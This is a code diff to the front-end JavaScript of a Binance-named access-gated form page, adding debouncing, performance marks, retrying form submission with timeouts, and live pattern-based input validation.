@@ -1,10 +1,44 @@
 // Constants
 const STORAGE_KEY = 'access0214';
 const ACCESS_TIMEOUT = 3600000; // 1 hour in milliseconds
+const DEBOUNCE_DELAY = 300; // Debounce delay for input validation
+const MAX_RETRY_ATTEMPTS = 3;
+const RETRY_DELAY = 1000;
 
 // Utils
 const $ = (selector) => document.querySelector(selector);
 const $$ = (selector) => document.querySelectorAll(selector);
+
+// Debounce utility function
+const debounce = (func, delay) => {
+  let timeoutId;
+  return (...args) => {
+    clearTimeout(timeoutId);
+    timeoutId = setTimeout(() => func.apply(null, args), delay);
+  };
+};
+
+// Performance monitoring
+const performanceMonitor = {
+  marks: new Map(),
+  
+  mark(name) {
+    if (performance && performance.mark) {
+      performance.mark(name);
+      this.marks.set(name, performance.now());
+    }
+  },
+  
+  measure(name, startMark) {
+    if (performance && performance.measure && this.marks.has(startMark)) {
+      try {
+        performance.measure(name, startMark);
+      } catch (e) {
+        console.warn('Performance measurement failed:', e);
+      }
+    }
+  }
+};
 
 class BinanceGuard {
   constructor() {
@@ -75,22 +109,66 @@ class BinanceGuard {
 
   async submitForm(formData) {
     this.setLoadingState(true);
+    performanceMonitor.mark('form-submit-start');
 
-    try {
-      const response = await fetch('/', {
-        method: 'POST',
-        body: formData,
-        headers: {
-          'Accept': 'application/json'
+    let retryCount = 0;
+    const maxRetries = MAX_RETRY_ATTEMPTS;
+
+    while (retryCount <= maxRetries) {
+      try {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
+
+        const response = await fetch('/', {
+          method: 'POST',
+          body: formData,
+          headers: {
+            'Accept': 'application/json',
+            'X-Requested-With': 'XMLHttpRequest'
+          },
+          signal: controller.signal
+        });
+
+        clearTimeout(timeoutId);
+
+        if (!response.ok) {
+          if (response.status >= 500 && retryCount < maxRetries) {
+            retryCount++;
+            await new Promise(resolve => setTimeout(resolve, RETRY_DELAY * retryCount));
+            continue;
+          }
+          throw new Error(`HTTP ${response.status}: ${response.statusText}`);
         }
-      });
 
-      if (!response.ok) throw new Error('Submission failed');
+        performanceMonitor.measure('form-submit-duration', 'form-submit-start');
+        this.handleSuccess();
+        return;
 
-      this.handleSuccess();
-    } catch (error) {
-      this.handleError(error);
+      } catch (error) {
+        if (error.name === 'AbortError') {
+          this.handleError(new Error('Request timeout. Please try again.'));
+          return;
+        }
+        
+        if (retryCount < maxRetries && this.isRetryableError(error)) {
+          retryCount++;
+          await new Promise(resolve => setTimeout(resolve, RETRY_DELAY * retryCount));
+          continue;
+        }
+        
+        this.handleError(error);
+        return;
+      }
     }
+  }
+
+  isRetryableError(error) {
+    const retryableErrors = [
+      'Failed to fetch',
+      'NetworkError',
+      'TypeError: Failed to fetch'
+    ];
+    return retryableErrors.some(errType => error.message.includes(errType));
   }
 
   setLoadingState(isLoading) {
@@ -125,16 +203,53 @@ class BinanceGuard {
 
   setupInputAnimations() {
     $$('input').forEach(input => {
-      input.addEventListener('focus', () => {
-        input.parentElement.style.transform = 'scale(1.01)';
-        input.parentElement.style.transition = 'transform 0.2s ease';
-      });
+      const handleFocus = () => {
+        if (input.parentElement) {
+          input.parentElement.style.transform = 'scale(1.01)';
+          input.parentElement.style.transition = 'transform 0.2s ease';
+        }
+      };
 
-      input.addEventListener('blur', () => {
-        input.parentElement.style.transform = '';
-        input.parentElement.style.transition = '';
+      const handleBlur = () => {
+        if (input.parentElement) {
+          input.parentElement.style.transform = '';
+          input.parentElement.style.transition = '';
+        }
+      };
+
+      // Real-time validation with debouncing
+      const debouncedValidation = debounce((value) => {
+        this.validateInputReal(input, value);
+      }, DEBOUNCE_DELAY);
+
+      input.addEventListener('focus', handleFocus);
+      input.addEventListener('blur', handleBlur);
+      input.addEventListener('input', (e) => {
+        debouncedValidation(e.target.value);
       });
     });
+  }
+
+  validateInputReal(input, value) {
+    const isValid = this.validateSingleInput(input, value);
+    const wrapper = input.closest('.input-wrapper') || input.parentElement;
+    
+    if (wrapper) {
+      wrapper.classList.toggle('input-valid', isValid && value.length > 0);
+      wrapper.classList.toggle('input-invalid', !isValid && value.length > 0);
+    }
+  }
+
+  validateSingleInput(input, value) {
+    if (!value) return true; // Don't validate empty inputs
+    
+    const pattern = input.getAttribute('pattern');
+    if (pattern) {
+      const regex = new RegExp(pattern);
+      return regex.test(value);
+    }
+    
+    return true;
   }
 
   checkAccess() {
